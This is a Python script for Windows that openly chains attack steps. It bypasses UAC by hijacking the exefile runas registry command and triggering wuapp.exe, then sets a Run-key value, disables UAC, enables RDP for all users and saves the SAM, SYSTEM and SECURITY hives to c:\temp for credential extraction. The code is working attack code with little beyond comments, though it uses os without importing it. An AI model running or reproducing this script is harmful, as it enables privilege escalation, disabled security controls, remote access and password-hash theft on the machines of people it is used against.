from _winreg import *
import win32com.shell.shell as shell
import ctypes, sys

def regkeyexists(key,subkey):
    """Check if key exists."""
    try:
        aKey = OpenKey(key, subkey, 0, KEY_WRITE)
        return True

    except WindowsError:
        return False

##Check if the script is running with admin privs.
isadmin = shell.IsUserAnAdmin()

if not isadmin:

##Use the rundll32.exe so that when something with admin privs is executed this script is executed instead.
    value = 'rundll32.exe SHELL32.DLL,ShellExec_RunDLL "C:\\Python27\\pythonw.exe"' + '"' + os.path.realpath(__file__) + '"'

    if not regkeyexists(HKEY_CURRENT_USER,r"Software\Classes\exefile\shell\runas\command"):
        CreateKey(HKEY_CURRENT_USER,r"Software\Classes\exefile\shell\runas\command")
        
    with OpenKey(HKEY_CURRENT_USER, r"Software\Classes\exefile\shell\runas\command", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
        SetValueEx(key, "IsolatedCommand" , 0, REG_SZ, value)
    
##Execute the windows update checker with admin privs. This will generate the UAC popup.
    shell.ShellExecuteEx(lpVerb='runas', lpFile="wuapp.exe")    

if isadmin:
    
#Remove the IsolatedCommand key, step by step cause python can't do it at once.
    if regkeyexists(HKEY_CURRENT_USER, r"Software\Classes\exefile\shell\runas\command"):
        DeleteKey(HKEY_CURRENT_USER, r"Software\Classes\exefile\shell\runas\command")
        DeleteKey(HKEY_CURRENT_USER, r"Software\Classes\exefile\shell\runas")
        DeleteKey(HKEY_CURRENT_USER, r"Software\Classes\exefile\shell")

#Write a test value to the run on boot key.
    with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
        SetValueEx(key, "TEST" , 0, REG_SZ, "TEST")

##Disable UAC notification.
    with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Security Center", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
        SetValueEx(key, "UACDisableNotify" , 0, REG_DWORD, 1)

#Disable UAC.
    with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
        SetValueEx(key, "ConsentPromptBehaviorAdmin" , 0, REG_DWORD, 0)

    with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
        SetValueEx(key, "EnableLUA" , 0, REG_DWORD, 0)

#Enable UAC notification.
    with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Security Center", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
        DeleteValue(key, "UACDisableNotify")

#Enable RDP (for all)
    with OpenKey(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
        SetValueEx(key, "fDenyTSConnections" , 0, REG_DWORD, 0)

##Save the SAM, SYSTEM and SECURITY files.

    shell.ShellExecuteEx(lpFile="reg.exe", lpParameters = "save hklm\\sam c:\\temp\\sam.save /y")
    shell.ShellExecuteEx(lpFile="reg.exe", lpParameters = "save hklm\\system c:\\temp\\system.save /y")
    shell.ShellExecuteEx(lpFile="reg.exe", lpParameters = "save hklm\\security c:\\temp\\security.save /y")
